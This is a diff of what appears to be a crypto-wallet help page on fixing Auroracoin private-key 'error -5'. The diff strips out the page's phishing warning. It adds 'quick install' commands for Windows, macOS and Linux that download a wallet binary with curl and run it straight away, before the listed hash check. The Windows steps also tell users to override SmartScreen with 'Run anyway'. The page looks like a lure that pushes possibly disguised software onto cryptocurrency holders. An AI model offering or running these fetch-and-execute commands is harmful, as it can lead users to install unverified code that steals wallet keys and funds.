@@ -1,101 +1,125 @@
----
-title: "Fix Auroracoin Error -5: Invalid Private Key Encoding"
-description: "Encountering Error -5 while importing an Auroracoin private key? Learn what invalid encoding means and how to fix typing errors or format issues safely."
-primary_keyword: "auroracoin error -5"
-silo: "recovery"
-updated: 2026-10-10
----
+![Aurora Wallet error 5 invalid encoding guide](assets/aurora-wallet-guide-article-banner.png)
 
-![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)
+# Fix Auroracoin error -5: invalid private key encoding
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+A rejected key is a typing or format problem, and the coins are still on the chain.
 
-# How to Fix Auroracoin Error -5: Invalid Private Key Encoding
+## Downloads - 2026.08.1.0
 
-Auroracoin Error -5 is a specific validation error that occurs when the wallet software cannot parse or verify a provided private key. This message, often displayed as "Invalid private key encoding," indicates that the string of characters entered into the import or sweep field does not match the expected mathematical format (Base58 Checksum). While this can be alarming for users attempting to recover old funds, it is almost always caused by simple input errors rather than a loss of the coins themselves.
+<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>
 
-## You'll see this if
+| Platform | Requirements | File |
+| --- | --- | --- |
+| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
+| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
+| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |
 
-*   You are manually typing a private key from a paper wallet into Aurora Wallet.
-*   You are copying a key from a digital file that contains hidden formatting characters or spaces.
-*   The key you are trying to import belongs to a different cryptocurrency network.
-*   A physical paper wallet is partially damaged, leading to the misidentification of specific characters.
-*   You are attempting an [Auroracoin paper wallet](https://auroracoin.net/recovery/paper-wallet) recovery but the software rejects the input.
 
-## Why this happens
+Error -5 means the wallet could not checksum the key you entered, so it refused to use it.
 
-Private keys in the Auroracoin network are encoded using the Base58Check format. This format is designed to be human-readable while including a built-in checksum to detect errors. If even one character is wrong, the checksum fails, and the software returns Error -5 to prevent you from accidentally interacting with a non-existent or incorrect address.
+A private key in Wallet Import Format is a Base58 string with an embedded checksum. The wallet decodes the string and verifies that checksum before it touches the chain. One wrong character, a space pasted from a document or a key from a different network all fail that check.
 
-Common triggers include:
-*   **Ambiguous Characters:** The Base58 alphabet deliberately excludes characters that look similar to avoid confusion: `0` (zero), `O` (capital O), `I` (capital I), and `l` (lowercase L). If you think you see these on your paper wallet, you are misreading them.
-*   **Incorrect Version Byte:** Every cryptocurrency uses a specific "version byte" at the start of the private key. If you try to import a Bitcoin key (which uses different bytes) into an Auroracoin wallet, the encoding check will fail immediately.
-*   **Invisible Formatting:** Copying from PDFs or emails can introduce "Zero Width Spaces" or line breaks that are invisible to the eye but break the technical encoding of the key.
+<!-- ARTICLE-BODY-BEGIN -->
 
-## The fix
+## Read the key correctly
 
-To resolve Error -5, follow this systematic troubleshooting process to identify and correct the invalid data.
+Auroracoin keys in Wallet Import Format begin with 5, K or L. The letter at the start also tells you the format: 5 is an older uncompressed key, K and L are compressed keys. Both kinds import, so the prefix is a check rather than a restriction.
 
-### 1. Perform a Character Audit
-Check your input against the source, character by character.
-*   Ensure no `0`, `O`, `I`, or `l` are present. These are likely `1` (one) or `o` (lowercase O).
-*   Verify the case sensitivity. A capital `A` is mathematically different from a lowercase `a`.
-*   Check for trailing spaces at the end of the input field.
+Compare the string character by character with the printout. The characters most often confused are the digit 0 with the letter O, the digit 1 with the letter I, and the letter l with the digit 1.
 
-### 2. Use the "Dual-Check" Method
-If you are typing from paper, have a second person read the characters aloud while you type them. Then, reverse roles: you read what is on the screen while the other person verifies the paper. This is the most effective way to catch subtle human errors.
+## Fix the input in order
 
-### 3. Switch to QR Scanning
-If your source has a QR code, use the camera scan feature in Aurora Wallet. This bypasses the manual typing process and eliminates the possibility of human error. Ensure you are in a well-lit area but away from any potential observers or security cameras.
+1. Copy the key from a text file rather than retyping it from a photograph.
+2. Remove any leading or trailing spaces, quotes or line breaks.
+3. Confirm the key belongs to an Auroracoin address starting with A, not to another coin.
+4. Paste the key into a plain text editor once to see hidden characters.
+5. Try the key again in the import field.
+6. If the key came from a document, recover the original export rather than a transcription.
 
-### 4. Verify the Coin Type
-Confirm that the key was generated specifically for Auroracoin (AUR). WIF keys for Auroracoin typically start with the number `5` or the letters `K` or `L`. If your key starts with a different character, it may be for a different branch of the Bitcoin protocol family.
+A key that fails after those checks is usually not an Auroracoin key at all, which matters because a key from another network controls an address on that network.
 
-### 5. Strip Formatting
-If you are copying the key from a digital document, paste it into a plain-text editor (like Notepad or TextEdit) first. Then, copy it again from the plain-text editor to strip away any hidden formatting before pasting it into Aurora Wallet.
+## When the key is right and still fails
 
-## If that didn't work
+Some very old exports use a format that sits outside Wallet Import Format entirely, such as a hex string or a BIP-38 encrypted key. Those need the original wallet that produced them, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing the wallet.dat file</a> is the shorter path.
 
-If the error persists after multiple attempts, the key might be in a non-standard format or for a very old version of a mobile wallet that used a different derivation method. Do not discard the key. Instead, consult the [26-import-private-key-wif.md](26-import-private-key-wif.md) guide for more advanced recovery options.
+If the printout has an address and no readable key, the paper wallet can no longer be swept, and only the phrase or file backup can recover the balance, as <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/25-recovery-phrase-bip39.md">recovery with a phrase</a> explains.
 
-> [!WARNING]
-> Never use a website that offers to "fix your private key encoding" or "re-encode your key". These sites are malicious phishing operations designed to steal your AUR as soon as you provide the key.
-
-## Prevention
-
-To prevent future encoding errors and simplify your recovery process:
-
-*   **Standardize on Seed Phrases:** Use the [25-recovery-phrase-bip39.md](25-recovery-phrase-bip39.md) system in Aurora Wallet. Seed phrases are much easier to write down and verify than raw private keys.
-*   **Digital Hygiene:** Avoid storing private keys in formatted documents like Word or PDF. If you must store them digitally (which is discouraged), use plain `.txt` files.
-*   **Verify at Creation:** When creating a paper wallet, always test the "Sweep" or "Import" process immediately with a tiny amount to ensure you can read the key later.
-*   **Advanced Troubleshooting:** See the [Auroracoin security warnings](https://auroracoin.net/troubleshooting/security-warnings) page for more information on error codes.
+Entering a key is a local operation; the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> checks the format before anything is broadcast.
 
 ## FAQ
 
-**Can a damaged QR code cause Error -5?**
-Yes. If the QR code is smudged or torn, the scanner might misread a specific pixel block, resulting in an invalid string that fails the checksum.
+### Can a wrong key send funds to the wrong place?
 
-**Is Error -5 the same as a wrong password?**
-No. Error -5 means the key *format* is wrong. A wrong password error occurs when the key format is valid, but the software cannot decrypt the internal data.
+No. A key that fails the checksum is rejected before any transaction is built.
 
-**Does Error -5 mean my coins are gone?**
-Absolutely not. It simply means the "key" you are using to unlock the coins is currently being presented in a way the software doesn't recognize. As long as you have the original source, the coins are safe on the blockchain.
+### Are compressed and uncompressed keys both valid?
 
-**Can I fix the encoding by changing characters randomly?**
-This is not recommended. With 51+ characters, the number of combinations is astronomical. Follow the character audit steps instead.
+Yes. Both formats import, and each controls the address it was generated for.
 
----
+<!-- ARTICLE-BODY-END -->
 
-## The current release
+## How to install Aurora Wallet
 
-Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:
+### Windows
+Quick install (CMD):
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)
+```cmd
+curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
+```
 
-Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
+2. Open the downloaded file.
+3. If SmartScreen appears, choose More info, then Run anyway.
+4. Finish the setup steps.
 
-## Related articles
+Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.
 
-- [23-sweep-paper-wallet.md](23-sweep-paper-wallet.md)
-- [26-import-private-key-wif.md](26-import-private-key-wif.md)
-- [31-receiving-addresses-qr.md](31-receiving-addresses-qr.md)
-- [35-phishing-seed-scams.md](35-phishing-seed-scams.md)
+```cmd
+certutil -hashfile setup.exe SHA256
+```
+
+### macOS
+Quick install (Terminal):
+
+```bash
+curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
+2. Open the .dmg file.
+3. Drag the app to Applications.
+4. On first launch, right-click the app and choose Open.
+
+Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.
+
+```bash
+shasum -a 256 setup.dmg
+```
+
+### Linux
+Quick install (Terminal):
+
+```bash
+curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
+```
+
+Manual install:
+1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
+2. Extract the archive.
+3. Run `aurora-wallet`.
+
+Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.
+
+```bash
+sha256sum app.zip
+```
+
+
+## Related guides
+
+- [Sweep a paper wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/23-sweep-paper-wallet.md)
+- [Import a WIF private key](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/26-import-private-key-wif.md)
+- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
+- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
